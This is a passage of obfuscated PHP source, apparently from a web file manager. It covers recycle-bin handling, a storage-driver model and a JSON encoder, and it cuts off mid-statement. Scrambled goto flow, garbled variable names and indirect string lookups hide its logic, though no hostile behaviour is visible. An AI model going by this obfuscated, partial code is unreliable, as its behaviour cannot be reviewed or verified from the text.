!0; } $a‹±∞™Ö√‘ = array(); goto eëËüÓÀ∞§; eëËüÓÀ∞§: foreach ($e“ÿèÉœ∂Ì as $c®ÜòŒËˆ¬) { goto AÂ©©”ùÿå; AÂ©©”ùÿå: if ($Bï¶Úœ≥Ó’ != !1 && !in_array($c®ÜòŒËˆ¬, $Bï¶Úœ≥Ó’)) { continue; } $fŒÇŒº°ôÀ = $e◊Û›≥‹§->where(array($dΩøÿõÎ´√[374] => $c®ÜòŒËˆ¬))->find(); $B„◊àï¿§± = $e◊Û›≥‹§->where(array($dΩøÿõÎ´√[374] => $fŒÇŒº°ôÀ[$dΩøÿõÎ´√[384]]))->find(); goto Dô¬∏ØØá√; f§ââ»ÛÏß: if ($fŒÇŒº°ôÀ[$dΩøÿõÎ´√[375]] == $dΩøÿõÎ´√[376]) { $a‹±∞™Ö√‘[] = $c®ÜòŒËˆ¬; } goto bôÌíÑÜò¿; Dô¬∏ØØá√: if ($B„◊àï¿§±[$dΩøÿõÎ´√[410]] == $dΩøÿõÎ´√[376]) { continue; } $this->recycleMove($c®ÜòŒËˆ¬, 0); if ($fŒÇŒº°ôÀ[$dΩøÿõÎ´√[375]] == $dΩøÿõÎ´√[376]) { $A˘ﬂ»≈ùì⁄ = array($dΩøÿõÎ´√[399] => array($dΩøÿõÎ´√[408], $fŒÇŒº°ôÀ[$dΩøÿõÎ´√[373]] . $c®ÜòŒËˆ¬ . $dΩøÿõÎ´√[409])); $e◊Û›≥‹§->where($A˘ﬂ»≈ùì⁄)->setField($dΩøÿõÎ´√[410], 0); } goto Càˆ»¬â Ô; Càˆ»¬â Ô: $this->where(array($dΩøÿõÎ´√[374] => $c®ÜòŒËˆ¬))->delete(); $e◊Û›≥‹§->folderSizeReset($fŒÇŒº°ôÀ[$dΩøÿõÎ´√[384]]); $a‹±∞™Ö√‘[] = $fŒÇŒº°ôÀ[$dΩøÿõÎ´√[384]]; goto f§ââ»ÛÏß; bôÌíÑÜò¿: } $e◊Û›≥‹§->updateModifyTime($a‹±∞™Ö√‘); goto f˜Ú’ç£û«; cä‹»ƒÛﬁ⁄: $dΩøÿõÎ´√ =& $_SERVER[∞„˜ƒÑºª]; $e◊Û›≥‹§ = Model($dΩøÿõÎ´√[832]); $e“ÿèÉœ∂Ì = $this->listData(); goto FöÖ¬ûÉ¨ó; f˜Ú’ç£û«: } private function recycleMove($cΩëˆÖúêä, $C±çæ÷ïôø = 1) { $F˜Ñù‹æ€› =& $_SERVER[∞„˜ƒÑºª]; $Aõ«‡¥πµä = Model($F˜Ñù‹æ€›[832]); $b›ÇïºØ‡ã = Model($F˜Ñù‹æ€›[1743]); $c ´ ÕËáó = array($F˜Ñù‹æ€›[374] => $cΩëˆÖúêä); if ($C±çæ÷ïôø) { $Aõ«‡¥πµä->where($c ´ ÕËáó)->setField($F˜Ñù‹æ€›[410], 1); $b›ÇïºØ‡ã->eventRecycle($cΩëˆÖúêä, $F˜Ñù‹æ€›[1744]); } else { $Eô—°–è√Î = $Aõ«‡¥πµä->where($c ´ ÕËáó)->find(); $f¥ƒÁÜùÿŸ = $Eô—°–è√Î[$F˜Ñù‹æ€›[375]] == $F˜Ñù‹æ€›[376]; $bÔ∫ÃŸ‡¬Â = $Aõ«‡¥πµä->fileNameAuto($Eô—°–è√Î[$F˜Ñù‹æ€›[384]], $Eô—°–è√Î[$F˜Ñù‹æ€›[28]], REPEAT_RENAME_FOLDER, $f¥ƒÁÜùÿŸ); if ($bÔ∫ÃŸ‡¬Â != $Eô—°–è√Î[$F˜Ñù‹æ€›[28]]) { $Aõ«‡¥πµä->rename($cΩëˆÖúêä, $bÔ∫ÃŸ‡¬Â); } $Aõ«‡¥πµä->where($c ´ ÕËáó)->setField($F˜Ñù‹æ€›[410], 0); $b›ÇïºØ‡ã->eventRecycle($cΩëˆÖúêä, $F˜Ñù‹æ€›[1745]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\163\x74\157\x72\x61\x67\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\x73\x69\x7a\145\115\141\x78", "\x73\x79\163\164\x65\x6d", "\144\145\x66\x61\165\154\164", "\144\x72\x69\166\x65\162", "\143\x6f\x6e\x66\151\x67"); public function listData($e·ñÚÌ∫Ö = false, $E∂î¢ÍÑô› = "\x6d\x6f\x64\x69\146\171\124\151\x6d\x65", $c¬õ√•ÑØŒ = false) { goto Cã⁄√€µã≠; eıµ¡á†Èâ: return $bêÉ¢ù‚èª; goto cÉØ° Ωﬁ®; Cã⁄√€µã≠: $dÇìñ¥„ëØ =& $_SERVER[∞„˜ƒÑºª]; $bêÉ¢ù‚èª = parent::listData($e·ñÚÌ∫Ö, $E∂î¢ÍÑô›, $c¬õ√•ÑØŒ); if ($e·ñÚÌ∫Ö) { return $bêÉ¢ù‚èª; } goto F£¨”çÚãÑ; F£¨”çÚãÑ: foreach ($bêÉ¢ù‚èª as $f§û·ÖÉ•º => $cıúÑà¢æÉ) { unset($bêÉ¢ù‚èª[$f§û·ÖÉ•º][$dÇìñ¥„ëØ[6]]); $bêÉ¢ù‚èª[$f§û·ÖÉ•º][$dÇìñ¥„ëØ[1502]] = 0; } $c ñÃˆ‘ÈÀ = array_to_keyvalue($bêÉ¢ù‚èª, $dÇìñ¥„ëØ[33], $dÇìñ¥„ëØ[366]); $this->_listAppendSize($bêÉ¢ù‚èª, $c ñÃˆ‘ÈÀ); goto eıµ¡á†Èâ; cÉØ° Ωﬁ®: } public function _listAppendSize(&$Eù⁄üÛÜ ©, $F÷⁄’éÜ˜´) { $C™µÿÚ°ﬂÈ =& $_SERVER[∞„˜ƒÑºª]; $FÖÓïÍÀ’⁄ = $C™µÿÚ°ﬂÈ[1746] . implode($C™µÿÚ°ﬂÈ[47], $F÷⁄’éÜ˜´) . $C™µÿÚ°ﬂÈ[1747]; $aœÆÍÙ–ïª = Model($C™µÿÚ°ﬂÈ[478])->query($FÖÓïÍÀ’⁄); $aœÆÍÙ–ïª = array_to_keyvalue($aœÆÍÙ–ïª, $C™µÿÚ°ﬂÈ[366], $C™µÿÚ°ﬂÈ[86]); foreach ($Eù⁄üÛÜ © as $c∑ÿ‰äî√á => $b¨Ö‰ëÊÒì) { $Eù⁄üÛÜ ©[$c∑ÿ‰äî√á][$C™µÿÚ°ﬂÈ[1502]] = isset($aœÆÍÙ–ïª[$b¨Ö‰ëÊÒì[$C™µÿÚ°ﬂÈ[366]]]) ? $aœÆÍÙ–ïª[$b¨Ö‰ëÊÒì[$C™µÿÚ°ﬂÈ[366]]] : 0; } } public function getConfig($FØù£∑êˆ”) { $Aı‹ë∏¯€‹ = parent::listData($FØù£∑êˆ”); return json_decode($Aı‹ë∏¯€‹[$_SERVER[∞„˜ƒÑºª][6]], !0); } public function update($B◊ﬁÈ¡ãŒÒ, $Bå—œÓâΩÉ) { goto dñÓ‡Éﬂ∂√; eûÑäË¡€Ú: if (isset($Eùã”¿Õ¿‚[$Dòâ‡◊ÊøÜ]) && $Eùã”¿Õ¿‚[$Dòâ‡◊ÊøÜ][$A‰Ûß±ïÚÒ[366]] != $B◊ﬁÈ¡ãŒÒ) { return !1; } if (isset($Bå—œÓâΩÉ[$A‰Ûß±ïÚÒ[1748]]) && $Bå—œÓâΩÉ[$A‰Ûß±ïÚÒ[1748]] == $A‰Ûß±ïÚÒ[376]) { $this->checkConfig($Bå—œÓâΩÉ); } unset($Bå—œÓâΩÉ[$A‰Ûß±ïÚÒ[1748]]); goto C™ïíÙíÇ∑; dñÓ‡Éﬂ∂√: $A‰Ûß±ïÚÒ =& $_SERVER[∞„˜ƒÑºª]; $Dòâ‡◊ÊøÜ = $Bå—œÓâΩÉ[$A‰Ûß±ïÚÒ[28]]; $Eùã”¿Õ¿‚ = array_to_keyvalue(parent::listData(), $A‰Ûß±ïÚÒ[28]); goto eûÑäË¡€Ú; C™ïíÙíÇ∑: $E¢¯Ê‹Ì£⁄ = parent::update($B◊ﬁÈ¡ãŒÒ, $Bå—œÓâΩÉ); if ($E¢¯Ê‹Ì£⁄ && $Bå—œÓâΩÉ[$A‰Ûß±ïÚÒ[34]]) { foreach ($Eùã”¿Õ¿‚ as $aÆ˜ìΩÓªó) { if ($aÆ˜ìΩÓªó[$A‰Ûß±ïÚÒ[34]] && $aÆ˜ìΩÓªó[$A‰Ûß±ïÚÒ[366]] != $B◊ﬁÈ¡ãŒÒ) { parent::update($aÆ˜ìΩÓªó[$A‰Ûß±ïÚÒ[366]], array($A‰Ûß±ïÚÒ[34] => 0)); } } } return $E¢¯Ê‹Ì£⁄; goto CªﬁîÕª¨Ü; CªﬁîÕª¨Ü: } public function add($aÑ∑∏¿øÊı) { goto A‡Û‹ÖéƒΩ; Cµºß∞ÀÌŸ: return $fÌÕäÉô«á; goto Bˆî≈§–†ﬂ; A‡Û‹ÖéƒΩ: $e™ÿ™ıæäﬂ =& $_SERVER[∞„˜ƒÑºª]; $f£—‹äπ‚â = array_to_keyvalue(parent::listData(), $e™ÿ™ıæäﬂ[28]); if (isset($f£—‹äπ‚â[$aÑ∑∏¿øÊı[$e™ÿ™ıæäﬂ[28]]])) { return !1; } goto aÁèÓêΩŒê; aÁèÓêΩŒê: $this->checkConfig($aÑ∑∏¿øÊı); $fÌÕäÉô«á = parent::insert($aÑ∑∏¿øÊı); if ($fÌÕäÉô«á && $aÑ∑∏¿øÊı[$e™ÿ™ıæäﬂ[34]]) { foreach ($f£—‹äπ‚â as $Föü±áÜ˘ö) { if ($Föü±áÜ˘ö[$e™ÿ™ıæäﬂ[34]]) { parent::update($Föü±áÜ˘ö[$e™ÿ™ıæäﬂ[366]], array($e™ÿ™ıæäﬂ[34] => 0)); } } } goto Cµºß∞ÀÌŸ; Bˆî≈§–†ﬂ: } public function checkConfig(&$C∞ÙÉ“©öÖ) { goto A‰£≥ƒ≈ê˘; D ºäà§¡ã: $b¬˜‹¨∞êé = $F”ùåä†„º->getPath($F·îªâ–î« . $FäÌ‰›¬∑˘[1362]); if (!$F”ùåä†„º->mkfile($b¬˜‹¨∞êé)) { show_json(LNG($FäÌ‰›¬∑˘[1750]), !1); } $Aÿß∆æêÃß[$FäÌ‰›¬∑˘[751]] = $F·îªâ–î«; goto EúÙı…‡ÒÒ; A‰£≥ƒ≈ê˘: $FäÌ‰›¬∑˘ =& $_SERVER[∞„˜ƒÑºª]; $b¶∏ì•ıä™ = strtolower($C∞ÙÉ“©öÖ[$FäÌ‰›¬∑˘[97]]); $Aÿß∆æêÃß = json_decode_force($C∞ÙÉ“©öÖ[$FäÌ‰›¬∑˘[6]]); goto C‡ÏàïΩãÆ; C‡ÏàïΩãÆ: foreach ($Aÿß∆æêÃß as $FÑ¥êÏ‚ü“ => $f∑ª—°ÖΩƒ) { $Aÿß∆æêÃß[$FÑ¥êÏ‚ü“] = trim($f∑ª—°ÖΩƒ); } $F·îªâ–î« = rtrim($Aÿß∆æêÃß[$FäÌ‰›¬∑˘[751]], $FäÌ‰›¬∑˘[8]) . $FäÌ‰›¬∑˘[8]; $A«ÍÍ⁄ù¬◊ = $this->driverType($b¶∏ì•ıä™); goto F≤ÑÛ‘ºÓ©; F≤ÑÛ‘ºÓ©: $E÷»Éî¶â∂ = $FäÌ‰›¬∑˘[80] . $A«ÍÍ⁄ù¬◊; $F”ùåä†„º = new $E÷»Éî¶â∂($Aÿß∆æêÃß); if (in_array($b¶∏ì•ıä™, $F”ùåä†„º->objectDriver)) { if (!$F”ùåä†„º->isBucketCors() && !$F”ùåä†„º->setBucketCors()) { show_json(LNG($FäÌ‰›¬∑˘[1749]), !1); } } goto D ºäà§¡ã; EúÙı…‡ÒÒ: $C∞ÙÉ“©öÖ[$FäÌ‰›¬∑˘[6]] = json_encode($Aÿß∆æêÃß); $C∞ÙÉ“©öÖ[$FäÌ‰›¬∑˘[97]] = $A«ÍÍ⁄ù¬◊; return !0; goto AÛè◊ÊΩÜ‘; AÛè◊ÊΩÜ‘: } private function driverType($B«†«ÂﬂﬁÀ) { $dÚ≥àŸ¥› =& $_SERVER[∞„˜ƒÑºª]; $d†€˘–”Æ± = array($dÚ≥àŸ¥›[133] => $dÚ≥àŸ¥›[1751], $dÚ≥àŸ¥›[66] => $dÚ≥àŸ¥›[1752], $dÚ≥àŸ¥›[73] => $dÚ≥àŸ¥›[752]); if (isset($d†€˘–”Æ±[$B«†«ÂﬂﬁÀ])) { return $d†€˘–”Æ±[$B«†«ÂﬂﬁÀ]; } return strtoupper($B«†«ÂﬂﬁÀ); } public function driverListSystem() { $d∆ˆØ‹–ﬂ¶ =& $_SERVER[∞„˜ƒÑºª]; $AÒ‡∏Õ˘¯ø = parent::listData(); $CÃúÛ¿â®é = array(); foreach ($AÒ‡∏Õ˘¯ø as $DôÆìüæ) { unset($DôÆìüæ[$d∆ˆØ‹–ﬂ¶[183]], $DôÆìüæ[$d∆ˆØ‹–ﬂ¶[109]]); $DôÆìüæ[$d∆ˆØ‹–ﬂ¶[6]] = json_decode_force($DôÆìüæ[$d∆ˆØ‹–ﬂ¶[6]]); $CÃúÛ¿â®é[] = $DôÆìüæ; } return $CÃúÛ¿â®é; } public function defaultDriver() { $Eºﬁœü≥°á =& $_SERVER[∞„˜ƒÑºª]; $Bÿ©äΩ»Ñﬁ = parent::listData(); $C”íüåÿãâ = array_filter_by_field($Bÿ©äΩ»Ñﬁ, $Eºﬁœü≥°á[34], 1); $C”íüåÿãâ = $C”íüåÿãâ[0]; if ($C”íüåÿãâ) { $C”íüåÿãâ[$Eºﬁœü≥°á[6]] = json_decode($C”íüåÿãâ[$Eºﬁœü≥°á[6]], !0); } return $C”íüåÿãâ; } public function driverInfo($b÷¥Êá§åΩ) { $bﬂ…∑óﬁÀ¥ =& $_SERVER[∞„˜ƒÑºª]; $Eï©€ß∞† = array_to_keyvalue(parent::listData(), $bﬂ…∑óﬁÀ¥[366]); if (!isset($Eï©€ß∞†[$b÷¥Êá§åΩ])) { return !1; } $B…∞úÊ≤´– = $Eï©€ß∞†[$b÷¥Êá§åΩ]; $B…∞úÊ≤´–[$bﬂ…∑óﬁÀ¥[6]] = json_decode_force($B…∞úÊ≤´–[$bﬂ…∑óﬁÀ¥[6]]); return $B…∞úÊ≤´–; } public function removeWithFile($aÑÿÿ†Û»ı) { goto E’†‹‘≤¢Ú; E’†‹‘≤¢Ú: $A¿¬çâ∂å¯ =& $_SERVER[∞„˜ƒÑºª]; $Düì√Ê—Ãñ = array($A¿¬çâ∂å¯[479] => $aÑÿÿ†Û»ı); $aòƒÕÏâÃ— = Model($A¿¬çâ∂å¯[1459])->where($Düì√Ê—Ãñ)->count(); goto dö›∏ªâ∂‘; f´ØÜ±âü“: $f ö’Æéäø = Model($A¿¬çâ∂å¯[163])->where($Düì√Ê—Ãñ)->field($A¿¬çâ∂å¯[1756])->select(); foreach ($f ö’Æéäø as $EÑ€Ãﬁ«ÙÒ) { goto fÏ’‘∫†úÒ; dá’ääï«ﬂ: Model($A¿¬çâ∂å¯[163])->where($Düì√Ê—Ãñ)->save($b±∏ﬁ“ﬂ⁄Ò); goto fü∏çà¶ÂÁ; fÏ’‘∫†úÒ: $A¿¨à«ñﬂº = $EÑ€Ãﬁ«ÙÒ[$A¿¬çâ∂å¯[84]]; $AŸìÌÌªﬁè = $AÙ¥≠òøÔ∞ . str_replace("\x7b\151\157\x3a{$aÑÿÿ†Û»ı}\x7d\57", $A¿¬çâ∂å¯[33], $A¿¨à«ñﬂº); if (!IO::exist($A¿¨à«ñﬂº)) { $this->removeByFileID($EÑ€Ãﬁ«ÙÒ[$A¿¬çâ∂å¯[382]]); continue; } goto C¿≥ç‹«”€; C¿≥ç‹«”€: if (!IO::exist($AŸìÌÌªﬁè) && !IO::move($A¿¨à«ñﬂº, $AŸìÌÌªﬁè)) { continue; } $Düì√Ê—Ãñ = array($A¿¬çâ∂å¯[382] => $EÑ€Ãﬁ«ÙÒ[$A¿¬çâ∂å¯[382]]); $b±∏ﬁ“ﬂ⁄Ò = array($A¿¬çâ∂å¯[479] => $a’áÒôÙ¬Ö, $A¿¬çâ∂å¯[84] => $AŸìÌÌªﬁè); goto dá’ääï«ﬂ; fü∏çà¶ÂÁ: } return parent::remove($aÑÿÿ†Û»ı); goto bßÏÍ‘äÓŒ; dö›∏ªâ∂‘: $aëüºà‰Ô = Model($A¿¬çâ∂å¯[1459])->where($Düì√Ê—Ãñ)->sum($A¿¬çâ∂å¯[86]); $bΩ∑øƒ›ﬂÃ = new TaskFileTransfer($A¿¬çâ∂å¯[1753] . $aÑÿÿ†Û»ı, $A¿¬çâ∂å¯[1754], $aòƒÕÏâÃ—, LNG($A¿¬çâ∂å¯[1755]) . "\50{$aÑÿÿ†Û»ı}\x29"); $bΩ∑øƒ›ﬂÃ->task[$A¿¬çâ∂å¯[454]] = $aëüºà‰Ô; goto F€´¿€®ÆŒ; F€´¿€®ÆŒ: $b£§ÓÏˆ—÷ = KodIO::defaultDriver(); $a’áÒôÙ¬Ö = $b£§ÓÏˆ—÷[$A¿¬çâ∂å¯[366]]; $AÙ¥≠òøÔ∞ = "\173\x69\x6f\72{$a’áÒôÙ¬Ö}\x7d\x2f"; goto f´ØÜ±âü“; bßÏÍ‘äÓŒ: } public function progress($DÛ„ä´„ûÈ) { return Task::get($_SERVER[∞„˜ƒÑºª][1753] . $DÛ„ä´„ûÈ); } private function removeByFileID($a…⁄ÃÑ‹Ã·) { $b…˜ÚÀ·ú≥ =& $_SERVER[∞„˜ƒÑºª]; $a¡ùáﬂí®‘ = Model($b…˜ÚÀ·ú≥[832])->field($b…˜ÚÀ·ú≥[1729])->where(array($b…˜ÚÀ·ú≥[382] => $a…⁄ÃÑ‹Ã·))->select(); $a¡ùáﬂí®‘ = array_to_keyvalue($a¡ùáﬂí®‘, $b…˜ÚÀ·ú≥[33], $b…˜ÚÀ·ú≥[374]); foreach ($a¡ùáﬂí®‘ as $F´∏–ïñø£) { Model($b…˜ÚÀ·ú≥[954])->remove($F´∏–ïñø£, !1); } } } goto AÈüÜä¨èµ; A˜∑≈Ú—µé: class Services_JSON { function __construct($e˘Û£’Öª¯ = 0) { $this->use = $e˘Û£’Öª¯; } function utf162utf8($E¿µçÁ≥Ô◊) { $E¢ßÁº°¯¶ =& $_SERVER[∞„˜ƒÑºª]; if (function_exists($E¢ßÁº°¯¶[77])) { return mb_convert_encoding($E¿µçÁ≥Ô◊, $E¢ßÁº°¯¶[1305], $E¢ßÁº°¯¶[1306]); } $A´≤ÜñûÔ¢ = ord($E¿µçÁ≥Ô◊[0]) << 8 | ord($E¿µçÁ≥Ô◊[1]); switch (!0) { case (127 & $A´≤ÜñûÔ¢) == $A´≤ÜñûÔ¢: return chr(127 & $A´≤ÜñûÔ¢); case (2047 & $A´≤ÜñûÔ¢) == $A´≤ÜñûÔ¢: return chr(192 | $A´≤ÜñûÔ¢ >> 6 & 31) . chr(128 | $A´≤ÜñûÔ¢ & 63); case (65535 & $A´≤ÜñûÔ¢) == $A´≤ÜñûÔ¢: return chr(224 | $A´≤ÜñûÔ¢ >> 12 & 15) . chr(128 | $A´≤ÜñûÔ¢ >> 6 & 63) . chr(128 | $A´≤ÜñûÔ¢ & 63); } return $E¢ßÁº°¯¶[33]; } function utf82utf16($dŒ¥Ù©øÇ∆) { $aÈæÜ®ÊÜ– =& $_SERVER[∞„˜ƒÑºª]; if (function_exists($aÈæÜ®ÊÜ–[77])) { return mb_convert_encoding($dŒ¥Ù©øÇ∆, $aÈæÜ®ÊÜ–[1306], $aÈæÜ®ÊÜ–[1305]); } switch (strlen($dŒ¥Ù©øÇ∆)) { case 1: return $dŒ¥Ù©øÇ∆; case 2: return chr(7 & ord($dŒ¥Ù©øÇ∆[0]) >> 2) . chr(192 & ord($dŒ¥Ù©øÇ∆[0]) << 6 | 63 & ord($dŒ¥Ù©øÇ∆[1])); case 3: return chr(240 & ord($dŒ¥Ù©øÇ∆[0]) << 4 | 15 & ord($dŒ¥Ù©øÇ∆[1]) >> 2) . chr(192 & ord($dŒ¥Ù©øÇ∆[1]) << 6 | 127 & ord($dŒ¥Ù©øÇ∆[2])); } return $aÈæÜ®ÊÜ–[33]; } function encode($eï≤•√Ùêë) { $fÉó™¨Øç  =& $_SERVER[∞„˜ƒÑºª]; switch (gettype($eï≤•√Ùêë)) { case $fÉó™¨Øç [1307]: return $eï≤•√Ùêë ? $fÉó™¨Øç [1308] : $fÉó™¨Øç [1309]; case $fÉó™¨Øç [1310]: return $fÉó™¨Øç [106]; case $fÉó™¨Øç [302]: return (int) $eï≤•√Ùêë; case $fÉó™¨Øç [277]: case $fÉó™¨Øç [276]: return (double) $eï≤•√Ùêë; case $fÉó™¨Øç [311]: $aÚ ùƒõß = $fÉó™¨Øç [33]; $b√≤Ø≠ÆÕÀ = strlen($eï≤•√Ùêë); for ($aı‚¿äãÀ’ = 0; $aı‚¿äãÀ’ < $b√≤Ø≠ÆÕÀ; ++$aı‚¿äãÀ’) { $B∆˘—Œ≈é‹ = ord($eï≤•√Ùêë[$aı‚¿äãÀ’]); switch (!0) { case $B∆˘—Œ≈é‹ == 8: $aÚ ùƒõß .= $fÉó™¨Øç [1311]; break; case $B∆˘—Œ≈é‹ == 9: $aÚ ùƒõß .= $fÉó™¨Øç [1312]; break; case $B∆˘—Œ≈é‹ == 10: $aÚ ùƒõß .= $fÉó™¨Øç [1313]; break; case $B∆˘—Œ≈é‹ == 12: $aÚ ùƒõß .= $fÉó™¨Øç [1314]; break; case $B∆˘—Œ≈é‹ == 13: $aÚ ùƒõß .= $fÉó™¨Øç [1315]; break; case $B∆˘—Œ≈é‹ == 34: case $B∆˘—Œ≈é‹ == 47: case $B∆˘—Œ≈é‹ == 92: $aÚ ùƒõß .= $fÉó™¨Øç [100] . $eï≤•√Ùêë[$aı‚¿äãÀ’]; break; case $B∆˘—Œ≈é‹ >= 32 && $B∆˘—Œ≈é‹ <= 127: $aÚ ùƒõß .= $eï≤•√Ùêë[$aı‚¿äãÀ’]; break; case ($B∆˘—Œ≈é‹ & 224) == 192: $DçõÈâﬂÉÑ = pack($fÉó™¨Øç [1316], $B∆˘—Œ≈é‹, ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 1])); $aı‚¿äãÀ’ += 1; $Eı–µèâÜú = $this->utf82utf16($DçõÈâﬂÉÑ); $aÚ ùƒõß .= sprintf($fÉó™¨Øç [1317], bin2hex($Eı–µèâÜú)); break; case ($B∆˘—Œ≈é‹ & 240) == 224: $DçõÈâﬂÉÑ = pack($fÉó™¨Øç [1316], $B∆˘—Œ≈é‹, ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 1]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 2])); $aı‚¿äãÀ’ += 2; $Eı–µèâÜú = $this->utf82utf16($DçõÈâﬂÉÑ); $aÚ ùƒõß .= sprintf($fÉó™¨Øç [1317], bin2hex($Eı–µèâÜú)); break; case ($B∆˘—Œ≈é‹ & 248) == 240: $DçõÈâﬂÉÑ = pack($fÉó™¨Øç [1316], $B∆˘—Œ≈é‹, ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 1]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 2]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 3])); $aı‚¿äãÀ’ += 3; $Eı–µèâÜú = $this->utf82utf16($DçõÈâﬂÉÑ); $aÚ ùƒõß .= sprintf($fÉó™¨Øç [1317], bin2hex($Eı–µèâÜú)); break; case ($B∆˘—Œ≈é‹ & 252) == 248: $DçõÈâﬂÉÑ = pack($fÉó™¨Øç [1316], $B∆˘—Œ≈é‹, ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 1]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 2]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 3]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 4])); $aı‚¿äãÀ’ += 4; $Eı–µèâÜú = $this->utf82utf16($DçõÈâﬂÉÑ); $aÚ ùƒõß .= sprintf($fÉó™¨Øç [1317], bin2hex($Eı–µèâÜú)); break; case ($B∆˘—Œ≈é‹ & 254) == 252: $DçõÈâﬂÉÑ = pack($fÉó™¨Øç [1316], $B∆˘—Œ≈é‹, ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 1]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 2]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 3]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 4]), ord($eï≤•√Ùêë[$aı‚¿äãÀ’ + 5])); $aı‚¿äãÀ’ += 5; $Eı–µèâÜú = $this->utf82utf16($DçõÈâﬂÉÑ); $aÚ ùƒõß .= sprintf($fÉó™¨Øç [1317], bin2hex($Eı–µèâÜú)); break; } } return $fÉó™¨Øç [110] . $aÚ ùƒõß . $fÉó™¨Øç [110]; case $fÉó™¨Øç [1318]: if (is_array($eï≤•√Ùêë) && count($eï≤•√Ùêë) && array_keys($eï≤•√Ùêë) !== range(0, sizeof($eï≤•√Ùêë) - 1)) { $FÀïƒ÷‹Øò = array_map(array($this, $fÉó™¨Øç [1319]), array_keys($eï≤•√Ùêë), array_values($eï≤•√Ùêë)); foreach ($FÀïƒ÷‹Øò as $aàÕÓŒ›≤ı) { if (Services_JSON::isError($aàÕÓŒ›≤ı)) { return $aàÕÓŒ›≤ı; } } return $fÉó™¨Øç [795] . join($fÉó™¨Øç [47], $FÀïƒ÷‹Øò) . $fÉó™¨Øç [314]; } $Eé”û≤éÃ© = array_map(array($this, $fÉó™¨Øç [1320]), $eï≤•√Ùêë); foreach ($Eé”û≤éÃ© as $C–ê©¯ÕÑ®) { if (Services_JSON::isError($C–ê©¯ÕÑ®)) { return $C–ê©¯ÕÑ®; } } return $fÉó™¨Øç [1321] . join($fÉó™¨Øç [47], $Eé”û≤éÃ©) . $fÉó™¨Øç [1322]; case $fÉó™¨Øç [1323]: $b‡æ¿£ØãŒ = get_object_vars($eï≤•√Ùêë); $FÀïƒ÷‹Øò = array_map(array($this, $fÉó™¨Øç [1319]), array_keys($b‡æ¿£ØãŒ), array_values($b‡æ¿£ØãŒ)); foreach ($FÀïƒ÷‹Øò as $aàÕÓŒ›≤ı) { if (Services_JSON::isError($aàÕÓŒ›≤ı)) { return $aàÕÓŒ›≤ı; } } return $fÉó™¨Øç [795] . join($fÉó™¨Øç [47], $FÀïƒ÷‹Øò) . $fÉó™¨Øç [314]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $fÉó™¨Øç [106] : new Services_JSON_Error(gettype($eï≤•√Ùêë) . $fÉó™¨Øç [1324]); } } function name_value($AÔéÜàÛ‹ì, $E¥∂’ÛÌ«π) { $f´æÜ¥¯™Ç = $this->encode($E¥∂’ÛÌ«π); if (Services_JSON::isError($f´æÜ¥¯™Ç)) { return $f´æÜ¥¯™Ç; } return $this->encode(strval($AÔéÜàÛ‹ì)) . $_SERVER[∞„˜ƒÑºª][4] . $f´æÜ¥¯™Ç; } function reduce_string($d›¥€ˆ£Œí) { $dıéõ“àõ÷ =& $_SERVER[∞„˜ƒÑºª]; $d›¥€ˆ£Œí = preg_replace(array($dıéõ“àõ÷[1325], $dıéõ“àõ÷[1326], $dıéõ“àõ÷[1327]), $dıéõ“àõ÷[33], $d›¥€ˆ£Œí); return trim($d›¥€ˆ£Œí); } function decode($aø·åœ¶Õﬂ) { $d¶Ë∫‰»Àé =& $_SERVER[∞„˜ƒÑºª]; $aø·åœ¶Õﬂ = $this->reduce_string($aø·åœ¶Õﬂ); switch (strtolower($aø·åœ¶Õﬂ)) { case $d¶Ë∫‰»Àé[1308]: return !0; case $d¶Ë∫‰»Àé[1309]: return !1; case $d¶Ë∫‰»Àé[106]: return null; default: $e¯í’ªÛ≠∫ = array(); if (is_numeric($aø·åœ¶Õﬂ)) { return (double) $aø·åœ¶Õﬂ == (int) $aø·åœ¶Õﬂ ? (int) $aø·åœ¶Õﬂ : (double) $aø·åœ¶Õﬂ; } elseif (preg_match($d¶Ë∫‰»Àé[1328], $aø·åœ¶Õﬂ, $e¯í’ªÛ≠∫) && $e¯í’ªÛ≠∫[1] == $e¯í’ªÛ≠∫[2]) { $b∞ı¬¥˘ıÓ = substr($aø·åœ¶Õﬂ, 0, 1); $aÆæÇ¢üü = substr($aø·åœ¶Õﬂ, 1, -1); $a¢≈≤Ωªçå = $d¶Ë∫‰»Àé[33]; $e¬‘ÍÒã∑” = strlen($aÆæÇ¢üü); for ($Eç∆æ∫·¨√ = 0; $Eç∆æ∫·¨√ < $e¬‘ÍÒã∑”; ++$Eç∆æ∫·¨√) { $FöŸÓƒ€•Ω = substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 2); $Bë∞÷çœ˜å = ord($aÆæÇ¢üü[$Eç∆æ∫·¨√]); switch (!0) { case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1311]: $a¢≈≤Ωªçå .= chr(8); ++$Eç∆æ∫·¨√; break; case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1312]: $a¢≈≤Ωªçå .= chr(9); ++$Eç∆æ∫·¨√; break; case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1313]: $a¢≈≤Ωªçå .= chr(10); ++$Eç∆æ∫·¨√; break; case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1314]: $a¢≈≤Ωªçå .= chr(12); ++$Eç∆æ∫·¨√; break; case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1315]: $a¢≈≤Ωªçå .= chr(13); ++$Eç∆æ∫·¨√; break; case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[985]: case $FöŸÓƒ€•Ω == 